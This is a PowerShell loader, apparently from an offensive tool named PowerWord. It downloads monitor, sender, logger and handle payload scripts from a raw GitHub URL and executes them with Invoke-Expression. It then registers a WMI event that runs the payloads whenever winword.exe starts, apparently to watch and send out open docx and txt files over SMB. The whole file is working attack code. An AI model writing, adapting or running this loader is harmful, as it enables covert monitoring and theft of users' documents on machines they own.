$config='
$global:LogLocation = "stdout"
$global:LogPath = "127.0.0.1:5000/log/"

$global:LiveMode = $true
$global:LiveModeInterval = 5
$global:WordFileExtentions =@("docx","txt")

$global:CommunicationMethod = "smb"
$global:Remote = "C:\temp\"

$global:HandelsMethod = "code"
$global:HandlesExeMethod = "remote"
$global:HandlesExePath = "D:\git\PowerWord\handle123.exe"
$global:HandlesExeRemoteLocation = "https://raw.githubusercontent.com/Lemonada/PowerWord/master/"

$global:LoadFromRemote = "yes"
$global:RemoteLoadPath = "https://raw.githubusercontent.com/Lemonada/PowerWord/master/"

$global:HandlePaylod = "default"
$global:MonitorPayload = "default"
$global:SenderPayload = "default"
$global:LoggerPayload = "default"
$global:HandlePsPayload = "default"
$global:HandlesMonitor = "default"
'

Invoke-Expression $config

function Get-Payloads{
    $FullScript = ""
    switch ($LoadFromRemote) {
        No {
            try {
                $global:MonitorPayload = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($MonitorPayload))
                $global:SenderPayload = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($SenderPayload))
                $global:LoggerPayload = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($LoggerPayload))
                $global:HandlePsPayload = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($HandlePsPayload))
            }
            catch {
                Write-Host "Wrong base64 format, check payloads"
                Exit
            }
            Write-Host "Done Getting Scripts"
          }
        Yes {
            if ($RemoteLoadPath -ne "default"){
                $webclient = new-object System.Net.WebClient
                try {
                    $global:MonitorPayload = $webclient.DownloadString($RemoteLoadPath + "Monitor.ps1")
                    $global:SenderPayload = $webclient.DownloadString($RemoteLoadPath + "Sender.ps1")
                    $global:LoggerPayload = $webclient.DownloadString($RemoteLoadPath + "Logger.ps1")
                    $global:HandlePsPayload = $webclient.DownloadString($RemoteLoadPath + "Handles.ps1")
                }
                catch {
                    Write-Host "Error contacting Remote Host"
                    Exit
                }
                Write-Host "Done Getting Scripts"

            }
            else {
                Write-Host "no RemoteLoadPath Flag given"
                Exit
            }
         }
        Default {
            Write-Host "Error deciding from where to read file, check flag -LoadFromRemote"
            Exit
        }
    }
    return $FullScript
}


function lolololol{
    Get-Payloads
    Invoke-Expression $HandlePsPayload
    Invoke-Expression $LoggerPayload
    if(!(Get-Handels-Method)){exit}
    $global:Payload = $MonitorPayload + $SenderPayload + $LoggerPayload + $HandlePsPayload
    if ($HandelsMethod -eq "code"){ $global:Payload += $HandlesMonitor}

    $Query = "Select * From __InstanceCreationEvent within 5 Where TargetInstance ISA 'Win32_Process'"
    $Identifier = "StartProcess"
    $ActionBlock = {
        $e = $event.SourceEventArgs.NewEvent.TargetInstance
        if ($e.Name -eq "winword.exe"){
            Invoke-Expression $Payload
            Send-Log -LogString "winword"
            Start-Mon -ProcID $e.ProcessID
        }
    }


    $proc = Get-Process -Name "winword" -ErrorAction SilentlyContinue
    if ($proc){
        Invoke-Expression $Payload
        Start-Mon -ProcID $proc.Id
    }
    $args
    Send-Log -LogString "starting listener"
    Register-WMIEvent -Query $Query -SourceIdentifier $Identifier -Action $ActionBlock
}

lolololol